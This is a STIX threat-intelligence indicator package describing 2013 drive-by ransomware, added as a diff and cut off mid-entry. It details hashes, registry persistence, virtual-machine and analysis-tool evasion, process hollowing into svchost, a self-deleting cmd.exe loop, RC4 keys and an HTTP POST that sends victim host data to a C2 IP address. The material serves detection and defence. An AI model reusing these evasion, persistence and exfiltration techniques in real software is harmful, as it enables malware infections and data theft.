@@ -1,0 +1,506 @@
+<stix:STIX_Package xmlns:MutexObj="http://cybox.mitre.org/objects#MutexObject-2" xmlns:cyboxVocabs="http://cybox.mitre.org/default_vocabularies-2" xmlns:WinRegistryKeyObj="http://cybox.mitre.org/objects#WinRegistryKeyObject-2" xmlns:URIObj="http://cybox.mitre.org/objects#URIObject-2" xmlns:FileObj="http://cybox.mitre.org/objects#FileObject-2" xmlns:stixCommon="http://stix.mitre.org/common-1" xmlns:cyboxCommon="http://cybox.mitre.org/common-2" xmlns:indicator="http://stix.mitre.org/Indicator-2" xmlns:marking="http://data-marking.mitre.org/Marking-1" xmlns:tlpMarking="http://data-marking.mitre.org/extensions/MarkingStructure#TLP-1" xmlns:stixVocabs="http://stix.mitre.org/default_vocabularies-1" xmlns:cybox="http://cybox.mitre.org/cybox-2" xmlns:stix="http://stix.mitre.org/stix-1" xmlns:CISCP="http://www.us-cert.gov/ciscp" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" id="CISCP:IB-13-10482" version="1.1.1" xsi:schemaLocation="http://cybox.mitre.org/objects#DomainNameObject-1 http://cybox.mitre.org/XMLSchema/objects/Domain_Name/1.0/Domain_Name_Object.xsd http://cybox.mitre.org/objects#PortObject-2 http://cybox.mitre.org/XMLSchema/objects/Port/2.1/Port_Object.xsd http://cybox.mitre.org/common-2 http://cybox.mitre.org/XMLSchema/common/2.1/cybox_common.xsd http://cybox.mitre.org/objects#WinRegistryKeyObject-2 http://cybox.mitre.org/XMLSchema/objects/Win_Registry_Key/2.1/Win_Registry_Key_Object.xsd http://stix.mitre.org/default_vocabularies-1 http://stix.mitre.org/XMLSchema/default_vocabularies/1.1.1/stix_default_vocabularies.xsd http://cybox.mitre.org/objects#FileObject-2 http://cybox.mitre.org/XMLSchema/objects/File/2.1/File_Object.xsd http://data-marking.mitre.org/Marking-1 http://stix.mitre.org/XMLSchema/data_marking/1.1.1/data_marking.xsd http://cybox.mitre.org/objects#SocketAddressObject-1 http://cybox.mitre.org/XMLSchema/objects/Socket_Address/1.1/Socket_Address_Object.xsd http://stix.mitre.org/common-1 http://stix.mitre.org/XMLSchema/common/1.1.1/stix_common.xsd http://data-marking.mitre.org/extensions/MarkingStructure#TLP-1 http://stix.mitre.org/XMLSchema/extensions/marking/tlp/1.1.1/tlp_marking.xsd http://stix.mitre.org/stix-1 http://stix.mitre.org/XMLSchema/core/1.1.1/stix_core.xsd http://cybox.mitre.org/objects#LinkObject-1 http://cybox.mitre.org/XMLSchema/objects/Link/1.1/Link_Object.xsd http://cybox.mitre.org/objects#AddressObject-2 http://cybox.mitre.org/XMLSchema/objects/Address/2.1/Address_Object.xsd http://cybox.mitre.org/default_vocabularies-2 http://cybox.mitre.org/XMLSchema/default_vocabularies/2.1/cybox_default_vocabularies.xsd http://cybox.mitre.org/objects#URIObject-2 http://cybox.mitre.org/XMLSchema/objects/URI/2.1/URI_Object.xsd http://stix.mitre.org/Indicator-2 http://stix.mitre.org/XMLSchema/indicator/2.1.1/indicator.xsd http://cybox.mitre.org/objects#EmailMessageObject-2 http://cybox.mitre.org/XMLSchema/objects/Email_Message/2.1/Email_Message_Object.xsd http://data-marking.mitre.org/extensions/MarkingStructure#Simple-1 http://stix.mitre.org/XMLSchema/extensions/marking/simple/1.1.1/simple_marking.xsd http://cybox.mitre.org/objects#MutexObject-2 http://cybox.mitre.org/XMLSchema/objects/Mutex/2.1/Mutex_Object.xsd http://cybox.mitre.org/objects#NetworkConnectionObject-2 http://cybox.mitre.org/XMLSchema/objects/Network_Connection/2.1/Network_Connection_Object.xsd http://us-cert.gov/ciscp http://www.us-cert.gov/sites/default/files/STIX_Namespace/ciscp_vocab_v1.1.1.xsd http://cybox.mitre.org/objects#HTTPSessionObject-2 http://cybox.mitre.org/XMLSchema/objects/HTTP_Session/2.1/HTTP_Session_Object.xsd http://cybox.mitre.org/cybox-2 http://cybox.mitre.org/XMLSchema/core/2.1/cybox_core.xsd">
+  <stix:STIX_Header>
+    <stix:Title>Web Drive-by Downloaded Ransomware Captures Host Informaiton</stix:Title>
+    <stix:Package_Intent xsi:type="stixVocabs:PackageIntentVocab-1.0">Indicators</stix:Package_Intent>
+    <stix:Description>On or around 31 JULY 2013, a malicious file was downloaded by users clicking on an anti-virus themed web drive-by attack.  Once downloaded and executed, the malicious file goes through a series of checks on the host machine.  If the host machine passes these checks, a process is loaded into memory and executed, persistence is established, and host information is sent to one command and control domain.</stix:Description>
+    <stix:Handling>
+      <marking:Marking>
+        <marking:Controlled_Structure>//node()</marking:Controlled_Structure>
+        <marking:Marking_Structure color="GREEN" xsi:type="tlpMarking:TLPMarkingStructureType"/>
+      </marking:Marking>
+    </stix:Handling>
+    <stix:Information_Source>
+      <stixCommon:Time>
+        <cyboxCommon:Produced_Time>2013-08-13T17:23:27Z</cyboxCommon:Produced_Time>
+      </stixCommon:Time>
+    </stix:Information_Source>
+  </stix:STIX_Header>
+  <stix:Indicators>
+    <stix:Indicator id="CISCP:indicator-217d33fc-c4bd-4707-b14a-ec2102c28a20" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Composite_Indicator_Expression operator="OR">
+        <indicator:Indicator idref="CISCP:indicator-9316afb1-0bc9-426e-b0a9-a804705368fc"/>
+        <indicator:Indicator idref="CISCP:indicator-7a3ae200-d669-46c0-99ed-2d7cc7f308f8"/>
+        <indicator:Indicator idref="CISCP:indicator-f83f80cb-f944-427c-bcd0-50462caf2b65"/>
+        <indicator:Indicator idref="CISCP:indicator-b64dbf29-37e1-4f24-9762-01a7f160fc15"/>
+        <indicator:Indicator idref="CISCP:indicator-1d6b30be-09d4-47a5-852d-aa0ca995361f"/>
+        <indicator:Indicator idref="CISCP:indicator-0e8e6876-71dc-49b8-83b2-86076de9618f"/>
+      </indicator:Composite_Indicator_Expression>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-9316afb1-0bc9-426e-b0a9-a804705368fc" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">Malware Artifacts</indicator:Type>
+      <indicator:Description>This file is a loader for an embedded executable. This file is heavily obfuscated and employs numerous anti-analysis and vm-ware procedures to thwart static and dynamic analysis techniques.
+If the file detects a virtual environment, the following procedure is performed:
+
+The following registry data is set:
+Key: HKLM\SYSTEM\CurrenControlSet\Control\Session Manager
+Value: PendingFileRenameOperations
+Data: [File path to "fvJcrgR.exe"]
+
+The file deletes itself from the host with the following command line statement:
+Command line: "C:\WINDOWS\system32\cmd.exe" /q /c for /l %i in (1,1,4000000000) do if not exist "C:\Documents and Settings\Administrator\Desktop\fvJcrgR.exe" (exit) else (del /f "C:\Documents and Settings\Administrator\Desktop\fvJcrgR.exe")
+
+The following procedures are performed by the malware to detect analysis environments:
+The following registry key is queried to check for Virtual Box:
+KEY: \\HKLM\HARDWARE\DESCRIPTION\System\VideoBiosVersion\
+Value: "VIRTUALBOX"
+
+The malware opens the physical disk (\\.\PhysicalDrive0), retrieves the disk type and compares the type to the following strings. This procedure acts as another virtual environment detection technique.
+"QEMU"
+"VMWARE"
+"VBOX"
+"VIRTUAL"
+"WARE"
+"ARRAY"
+"QM00001"
+"00000000000000000001"
+
+The malware is also capable of creating a running process list and parsing the process names for specific strings associated with analysis tools such as wireshark. In addition, string analysis indicates possible AV detection and Internet connection checks.
+
+If no virtual environment or analysis tool is detected, the malware loads a buffer into memory and decompresses the buffer. The decompressed data is a PE file. The malware then creates a process using the command line:
+"C:\WINDOWS\system32\svchost.exe". The process is created with the following parameters:
+|ModuleFileName = "C:\WINDOWS\system32\svchost.exe"
+|CommandLine = NULL
+|pProcessSecurity = NULL
+|pThreadSecurity = NULL
+|InheritHandles = FALSE
+|CreationFlags = CREATE_SUSPENDED
+|pEnvironment = NULL
+|CurrentDir = NULL
+|pStartupInfo = 0012F6A0
+\pProcessInfo = 0012F6F8
+
+The "CreationFlags" parameter indicates that the process be created but suspended. This allows the malware to overwrite the memory space of the suspended process with the decompressed payloads. Once the memory is overwritten, the process is resumed.</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-c5315ed6-ae1c-4192-bbde-1943366a365d">
+        <cybox:Object id="CISCP:Object-46ecd39e-da57-4ed7-b948-c7cac6351956">
+          <cybox:Properties xsi:type="FileObj:FileObjectType">
+            <FileObj:File_Name condition="Equals">fvJcrgR.exe</FileObj:File_Name>
+            <FileObj:Size_In_Bytes condition="Equals">145408</FileObj:Size_In_Bytes>
+            <FileObj:Hashes>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">MD5</cyboxCommon:Type>
+                <cyboxCommon:Simple_Hash_Value condition="Equals">3e69fd1aa0486e3dea2cd5c484938947</cyboxCommon:Simple_Hash_Value>
+              </cyboxCommon:Hash>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA1</cyboxCommon:Type>
+                <cyboxCommon:Simple_Hash_Value condition="Equals">5f8867df91de02c1218d14a1f2fabf1e30e7b3c4</cyboxCommon:Simple_Hash_Value>
+              </cyboxCommon:Hash>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA256</cyboxCommon:Type>
+                <cyboxCommon:Simple_Hash_Value condition="Equals">3ab13add8ff4e99633909ee1864d0500de695f1b3888ee330bf3dc6da5df8a33</cyboxCommon:Simple_Hash_Value>
+              </cyboxCommon:Hash>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SSDEEP</cyboxCommon:Type>
+                <cyboxCommon:Fuzzy_Hash_Value condition="Equals">3072:gZRiI2jH+Cr8OprtdOh7Muj1JlgMRJp9vJa2xdMb:Gyrj8O/duVjNgMM/</cyboxCommon:Fuzzy_Hash_Value>
+              </cyboxCommon:Hash>
+            </FileObj:Hashes>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Installation" ordinality="5" phase_id="stix:KillChainPhase-e1e4e3f7-be3b-4b39-b80a-a593cfd99a4f"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2013-07-31T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-7a3ae200-d669-46c0-99ed-2d7cc7f308f8" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">Malware Artifacts</indicator:Type>
+      <indicator:Description>The residual file is considered ransom&#8208;ware in that it can prevent the user from interacting with the victim host. This malware is also capable of downloading and executing files on the victim host. The file is decompressed and injected by the file "fvJcrgR.exe". The file is never written to the file system and has no
+significant file name. The file will be referred to as "Injected.exe" in this
+report.
+
+When executed, this file performs the following actions on the victim host:
+
+The file performs detection procedures for VMware, VirtualPC, VirtualBox and QEMU.
+
+A running process list is created and the file parses the process names for specific applications such as Wireshark (wireshark.exe).
+
+The detection procedures above are performed throughout execution based on certain conditions. This technique makes analysis more difficult as the checks have to be bypassed constantly during execution.
+If the file detects any of the virtual environments or applications, the process
+exits and the loader file is deleted.
+
+If no detections are triggered, the file performs the following actions: 
+
+The mutex "54f50902&#8208;deeb&#8208;4510&#8208;ae6c&#8208;dbcc1bdfb6dd" is created.
+
+An Internet connection check is performed by sending a DNS request for
+"http://www.google.com".
+
+The following registry keys are deleted:
+Key 1: HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot
+Key 2: HKCU\SYSTEM\CurrentControlSet\Control\SafeBoot
+
+Entrenchment is achieved in the registry by setting the following values:
+KEY 1: HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+KEY 2: HKLM\Software\Microsoft\Windows\CurrentVersion\Run
+Value: aSQw8ccL0
+Data: [path to loader file 'fvJcrgR.exe']
+
+The file has the capability to copy the loader file to the user's %Application Data% directory, execute the copy and delete the original file.
+
+The file queries the following registry value:
+Key: HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer
+Value: tHXttg3GeaXlpbp
+
+The file beacons to the URL "http://www.ip&#8208;address.org/ip&#8208;checker.php". The
+response from the URL should appear as follows.
+document.write('&lt;table&gt;&lt;tr&gt;&lt;td&gt;Hello, visitor from: &lt;strong&gt;[LOCATION]&lt;/strong&gt;&amp;nbsp;');
+document.write('&lt;img src=\'http[:]//www[.]ip&#8208;address.org/images/ip&#8208;flags/us.png\'&gt;&lt;/td&gt;&lt;/tr&gt;');
+document.write('&lt;tr&gt;&lt;td&gt;Your Country Code: &lt;b&gt;[COUNTRY CODE]&lt;/b&gt;&lt;/td&gt;&lt;/tr&gt;');
+document.write('&lt;tr&gt;&lt;td&gt;Your IP State: &lt;b&gt;[STATE}&lt;/b&gt;&lt;/td&gt;&lt;/tr&gt;');
+document.write('&lt;tr&gt;&lt;td&gt;Your IP Address: &lt;b&gt;[VICTIM IP ADRESS]&lt;/b&gt;&lt;/td&gt;&lt;/tr&gt;');
+document.write('&lt;tr&gt;&lt;td&gt;Your Hostname: &lt;b&gt;VICTIM&lt;/b&gt;&lt;/td&gt;&lt;/tr&gt;');
+document.write('&lt;tr&gt;&lt;td&gt;Your Longitude: &lt;b&gt;[LONGITUDE]&lt;/b&gt;&lt;/td&gt;&lt;/tr&gt;');
+document.write('&lt;tr&gt;&lt;td&gt;Your Latitude: &lt;b&gt;[LATITUDE]&lt;/b&gt;&lt;/td&gt;&lt;/tr&gt;');
+document.write('&lt;tr&gt;&lt;td&gt;Your ISP: &lt;b&gt;[ISP]&lt;/b&gt;&lt;/td&gt;&lt;/tr&gt;');
+document.write('&lt;tr&gt;&lt;td&gt;Your Organization: &lt;b&gt;[REGISTERED ORG.]&lt;/b&gt;&lt;/td&gt;&lt;/tr&gt;');
+document.write('&lt;tr&gt;&lt;td&gt;Powered by &lt;a rel=nofollow href=http://www.ip&#8208;address.org&gt;IP&#8208;Address.org&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;');
+The file then parses the response for specific HTML tags, copies the information provided by the website, RC4 encrypts the data and saves the data to the following registry value:
+Encryption Key: "Ldg2fRqG2BzY1wwTEMBg4WWA5ynx7P3na5k5p7"
+Key: HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer
+Value: tHXttg3GeaXlpbp
+Data: [Encrypted IP address]
+Value: "QUOHtRIUqmR"
+Data: [Encrypted Location]
+Value: "uRx0WUHLdluA"
+Data: [Encrypted ISP]
+
+NOTE: The RC4 table used by the malware does not reset after each iteration of the encryption algorithm. The table used is re&#8208;scrambled before each of the three iterations.
+
+Any installed antivirus applications are enumerated by the file executing the WQL
+query, "Select * from AntiVirusProduct". The output from the query is then compared
+to the following AV vendor names:
+Emsisoft
+Lavasoft
+avast
+AVG
+Avira
+BitDefender
+COMODO
+F&#8208;Secure
+GData
+Kaspersky
+McAfee
+ESET
+Norton
+Microsoft Security Essentials
+Panda
+Sophos
+TrendMicro
+Symantec
+BullGuard
+VIPRE
+Webroot
+
+All system information gathered by the malware is formatted and printed to a string(see below):
+"ver=0.0.0.15&amp;subid=3430711&amp;advid=0&amp;os=2600&amp;idx=2322607230&amp;langid=36764&amp;width=2140&amp;h eight=1441&amp;pil=0xFFFFFFFF&amp;av=(null)&amp;vv=0&amp;ip=192.168.1.100&amp;loc= United States&amp;isp=[ISP NAME]&amp;code=12&amp;payload=(null)"
+The data above is RC4 encrypted using the following string as the key. Once encrypted, the data is Base64 encoded.
+Encryption Key:
+"ykpslimsZBJh52i6s1Eb1rWAjKXF0MoO4rp5w3gsaGUUR0ebJuSlPVYmxYiKuQBmn3lONlKy"
+A socket is created and a connection is initiated with the IP address "5.104.106.79" via port 80. Once a connection is established, the malware sends a large buffer of data (see below). The data appended to the request is the Base64 encoded data mentioned above.
+
+POST /index.php HTTP/1.1
+Content&#8208;Type: multipart/form&#8208;data; boundary=113039734
+Host: 5.104.106.79
+Connection: close
+Cache&#8208;Control: no&#8208;cache
+Content&#8208;Length: 452
+&#8208;&#8208;113039734
+Content&#8208;Disposition: form&#8208;data; name="data"; filename="2322607230"
+Content&#8208;Type: application/octet&#8208;stream
+
+2aUpGp1ep/xHsUoYZw1tI0NSPLsySuBYF6Ikqpeu9wqLs1qccrjOJEePzx6SL [...]
+
+The response from the C2 node must begin with a "HTTP/1.1 200" response. The data appended to the HTTP response must be Base64 encoded and RC4 encrypted using the following key:
+
+Encryption Key:
+"ykpslimsZBJh52i6s1Eb1rWAjKXF0MoO4rp5w3gsaGUUR0ebJuSlPVYmxYiKuQBmn3lONlKy"
+
+Once downloaded and de&#8208;obfuscated, the malware is capable of executing the file via process injection. The malware creates a suspended process with the command line, "C:\WINDOWS\system32\svchost.exe" and overwrites the process memory with the downloaded file. The process is then resumed.
+
+Desktop Lock&#8208;down:
+
+The malware creates a new Desktop named "57c6d632&#8208;1fb1&#8208;472d&#8208;b27a&#8208;e0bfe67073b4" on the victim host and switches to the new desktop. This action locks the user out of their normal desktop environment.
+
+The malware is also capable of hiding the Windows system applications "Program Manager" and the Windows Task Bar (Shell_TrayWnd). Hiding these components would prevent the user from interacting with the desktop.
+
+Relevant String Data:
+This file employs string obfuscation to hide its relevant strings and thwart static analysis. The decoded strings displayed below are also present in the loader file "fvJcrgR.exe":
+4d6df541&#8208;5d57&#8208;46cd&#8208;be77&#8208;bf059bc9d1d1
+"\\.\PhysicalDrive%d"
+"|$$$}rstuvwxyz{$$$$$$$&gt;?@ABCDEFGHIJKLMNOPQRSTUVW$$$$$$XYZ[\]^_`abcdefghijklmnopq"
+"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
+"0123456789abcdef"
+"root\CIMV2"
+"WQL"
+"SELECT * FROM %s"
+"ROOT\SecurityCenter"
+"ROOT\SecurityCenter2"
+"Select * from AntiVirusProduct"
+"displayName"
+"OPEN %s.mp3 TYPE MpegVideo ALIAS MP3"
+"PLAY MP3 wait"
+"CLOSE MP3"
+"wireshark.exe"
+"pstorec.dll"
+"SbieDll.dll"
+"HARDWARE\DESCRIPTION\System"
+"VideoBiosVersion"
+"VIRTUALBOX"
+"QEMU"
+"VMWARE"
+"VBOX"
+"VIRTUAL"
+"WARE"
+"ARRAY"
+"QM00001"
+"00000000000000000001"
+"/q /c for /l %%i in (1,1,4000000000) do if not exist "%s" (exit) else (del /f
+"%s")"
+"ComSpec"
+"svchost.exe"
+"Winsta0\Default"
+"taskmgr.exe"
+"explorer.exe"
+"Program Manager"
+"Shell_TrayWnd"
+"Low"
+"cam"
+"FriendlyName"
+"Capture Filter"
+"SampleGrab"
+"NullRender"
+"%s%s.bmp"
+"POST /%s HTTP/1.1
+Content&#8208;Type: multipart/form&#8208;data; boundary=%u
+Host: %s
+Connection: close
+Cache&#8208;Control: no&#8208;cache
+Content&#8208;Length: %ld
+"&#8208;&#8208;%u
+Content&#8208;Disposition: form&#8208;data; name="data"; filename="%s"
+Content&#8208;Type: application/octet&#8208;stream
+&#8208;&#8208;%d&#8208;&#8208;
+"HTTP/1.1 200"
+"%s
+\%s
+%s
+%
+"404 Not Found"
+"ver=%u.%u.%u.%u&amp;subid=%u&amp;advid=%u&amp;os=%u&amp;idx=%u&amp;langid=%u&amp;width=%u&amp;height=%u&amp;pil=0x
+%X&amp;av=%s&amp;vv=%u&amp;ip=%s&amp;loc=%s&amp;isp=%s"
+"%s&amp;code=%d&amp;payload=%s"
+"http[:]//"
+"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)"
+"index.php"
+"Software\Microsoft\Windows\CurrentVersion\Explorer"
+"Software\Microsoft\Windows\CurrentVersion\Run"
+"SYSTEM\CurrentControlSet\Control\SafeBoot"
+"http[:]//www[.]ip&#8208;address.org/ip&#8208;checker.php"
+"n/a"
+"&lt;tr&gt;&lt;td&gt;Your IP Address: &lt;b&gt;"
+"&lt;/b&gt;&lt;/td&gt;&lt;/tr&gt;"
+"Hello, visitor from: &lt;strong&gt;"
+"&lt;/strong&gt;&amp;nbsp;"
+"&lt;tr&gt;&lt;td&gt;Your ISP: &lt;b&gt;"
+"main.htm"
+"&lt;!DOCT"
+"ip1"
+"ip2"
+"location"
+"isp"
+"$PATH"
+"ERROR"
+"OK"
+"SendVoucher"
+"winver"
+"username"
+"$AVID"
+"Emsisoft"
+"Lavasoft"
+"avast"
+"AVG"
+"Avira"
+"BitDef"
+"COMODO"
+"F&#8208;Secure"
+"G Data"
+"Kaspersky"
+"McAfee"
+"ESET"
+"Norton"
+"Microsoft Security Essentials"
+"Panda"
+"Sophos"
+"Trend Micro"
+"Symantec"
+"BullGuard"
+"VIPRE"
+"Webroot"
+"XP"
+"Server 2003"
+"2000"
+"Vista"
+"Server 2008"
+"2012"
+"http[:]//www[.]google.com"
+"NTDLL.DLL"
+"KERNEL32.DLL"
+"ADVAPI32.DLL"
+"WININET.DLL"
+"SHELL32.DLL"
+"USER32.DLL"
+"SHLWAPI.DLL"
+"CRYPTDLL.DLL"
+"OLE32.DLL"
+"5.104.106.79"
+"ykpslimsZBJh52i6s1Eb1rWAjKXF0MoO4rp5w3gsaGUUR0ebJuSlPVYmxYiKuQBmn3lONlKy"
+"S4RM1Z5Kb3y2IhaySqHhk4QHBCsnDY2Q"
+"tHXttg3GeaXlpbp"
+"QUOHtRIUqmR"
+"uRx0WUHLdluA"
+"Ldg2fRqG2BzY1wwTEMBg4WWA5ynx7P3na5k5p7"
+"aSQw8ccL0"
+"9f2c10a0&#8208;f56c&#8208;464d&#8208;b90f&#8208;23109eb5be53"
+"57c6d632&#8208;1fb1&#8208;472d&#8208;b27a&#8208;e0bfe67073b4"
+"54f50902&#8208;deeb&#8208;4510&#8208;ae6c&#8208;dbcc1bdfb6dd"
+"eb0e9e50&#8208;507e&#8208;43f2&#8208;88de&#8208;5ac793424fa7"
+"03d1e585&#8208;044d&#8208;436f&#8208;8c8c&#8208;c71de13aa497"</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-a2947596-82ef-4056-8b3f-aacfb88ea64d">
+        <cybox:Object id="CISCP:Object-ebac1c58-e9a1-4f6b-9176-8912ee4f1321">
+          <cybox:Properties xsi:type="FileObj:FileObjectType">
+            <FileObj:File_Name condition="Equals">Injected.exe</FileObj:File_Name>
+            <FileObj:Size_In_Bytes condition="Equals">66048</FileObj:Size_In_Bytes>
+            <FileObj:Hashes>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">MD5</cyboxCommon:Type>
+                <cyboxCommon:Simple_Hash_Value condition="Equals">ca6b2e73e8babb84d5c45f272c9dc8c3</cyboxCommon:Simple_Hash_Value>
+              </cyboxCommon:Hash>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA1</cyboxCommon:Type>
+                <cyboxCommon:Simple_Hash_Value condition="Equals">6877281ec89ce5ceb3480047f7b1bd351c9e5ea3</cyboxCommon:Simple_Hash_Value>
+              </cyboxCommon:Hash>
+            </FileObj:Hashes>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Installation" ordinality="5" phase_id="stix:KillChainPhase-e1e4e3f7-be3b-4b39-b80a-a593cfd99a4f"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2013-07-31T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-f83f80cb-f944-427c-bcd0-50462caf2b65" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">Malware Artifacts</indicator:Type>
+      <indicator:Description>This registry key is created to establish persistence.  Note that the DATA will just be the path to the file "fvJcrgR.exe".</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-9b74bc83-ccf9-4912-8e5d-227f03018712">
+        <cybox:Object id="CISCP:Object-65a393c8-31d6-462b-9c54-66cb1e38dc4d">
+          <cybox:Properties xsi:type="WinRegistryKeyObj:WindowsRegistryKeyObjectType">
+            <WinRegistryKeyObj:Key condition="Equals">\Software\Microsoft\Windows\CurrentVersion\Run</WinRegistryKeyObj:Key>
+            <WinRegistryKeyObj:Hive condition="Equals">HKEY_LOCAL_MACHINE</WinRegistryKeyObj:Hive>
+            <WinRegistryKeyObj:Values>
+              <WinRegistryKeyObj:Value>
+                <WinRegistryKeyObj:Name condition="Equals">aSQw8ccL0</WinRegistryKeyObj:Name>
+                <WinRegistryKeyObj:Data condition="Equals">[path to loader file 'fvJcrgR.exe']</WinRegistryKeyObj:Data>
+              </WinRegistryKeyObj:Value>
+            </WinRegistryKeyObj:Values>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Installation" ordinality="5" phase_id="stix:KillChainPhase-e1e4e3f7-be3b-4b39-b80a-a593cfd99a4f"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2013-07-31T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-b64dbf29-37e1-4f24-9762-01a7f160fc15" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">Malware Artifacts</indicator:Type>
+      <indicator:Description>This mutex is created if the file "fvJcrGR.exe" determines that there is no virtual environment, and no analysis tools running.</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-d383d093-20d9-44fb-a045-abb171380eb2">
+        <cybox:Object id="CISCP:Object-54ddf872-409a-46ba-a8f4-0113e340d54c">
+          <cybox:Properties xsi:type="MutexObj:MutexObjectType">
+            <MutexObj:Name condition="Equals">54f50902-deeb-4510-ae6c-dbcc1bdfb6dd</MutexObj:Name>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Installation" ordinality="5" phase_id="stix:KillChainPhase-e1e4e3f7-be3b-4b39-b80a-a593cfd99a4f"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2013-07-31T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-1d6b30be-09d4-47a5-852d-aa0ca995361f" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">Malware Artifacts</indicator:Type>
+      <indicator:Description>This registry entry is created if the file "fvJcrgR.exe" detects that it is running in virtual machine environment.</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-6684831c-119b-47ef-9f7f-f36f86eeac43">
+        <cybox:Object id="CISCP:Object-5275802f-7a16-4613-ad86-d5eb0e53c3c7">
+          <cybox:Properties xsi:type="WinRegistryKeyObj:WindowsRegistryKeyObjectType">
+            <WinRegistryKeyObj:Key condition="Equals">SYSTEM\CurrenControlSet\Control\Session Manager</WinRegistryKeyObj:Key>
+            <WinRegistryKeyObj:Hive condition="Equals">HKEY_LOCAL_MACHINE</WinRegistryKeyObj:Hive>
+            <WinRegistryKeyObj:Values>
+              <WinRegistryKeyObj:Value>
+                <WinRegistryKeyObj:Name condition="Equals">PendingFileRenameOperations</WinRegistryKeyObj:Name>
+                <WinRegistryKeyObj:Data condition="Equals">[File path to "fvJcrgR.exe"]</WinRegistryKeyObj:Data>
+              </WinRegistryKeyObj:Value>
+            </WinRegistryKeyObj:Values>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Installation" ordinality="5" phase_id="stix:KillChainPhase-e1e4e3f7-be3b-4b39-b80a-a593cfd99a4f"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2013-07-31T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-0e8e6876-71dc-49b8-83b2-86076de9618f" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">C2</indicator:Type>
+      <indicator:Description>This socket is established to send an encrypted data string.  The data string has host machine information.
+
+Encryption Key:
+"ykpslimsZBJh52i6s1Eb1rWAjKXF0MoO4rp5w3gsaGUUR0ebJuSlPVYmxYiKuQBmn3lONlKy"
+
+-----BEGIN POST REQUEST------
+POST /index.php HTTP/1.1
+Content&#8208;Type: multipart/form&#8208;data; boundary=113039734
